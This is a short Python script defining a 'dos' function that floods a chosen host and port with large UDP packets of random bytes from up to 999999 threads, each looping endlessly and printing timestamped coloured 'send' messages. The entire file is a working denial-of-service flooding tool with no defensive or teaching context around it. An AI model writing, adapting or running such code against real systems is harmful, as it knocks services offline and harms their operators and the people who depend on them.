import datetime
import random
import socket
import threading
import time

import colorama

color = colorama.Fore
date = datetime.datetime.now().time()


def dos(host=None, thread=None, port=None):
    if port == None:
        port = 8080
    if thread == None:
        thread = 999999
    print(host)
    print(port)
    print(thread)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(90240)

    def send_packets():
        while True:
            try:
                date = datetime.datetime.now().time()
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}]{color.YELLOW} Done Send new requests to {color.GREEN}{host} "
                )
                sock.sendto(data, (host, port))
            except:
                pass

    start_time = time.perf_counter()
    for i in range(thread):
        t = threading.Thread(target=send_packets)
        t.daemon = True
        t.start()
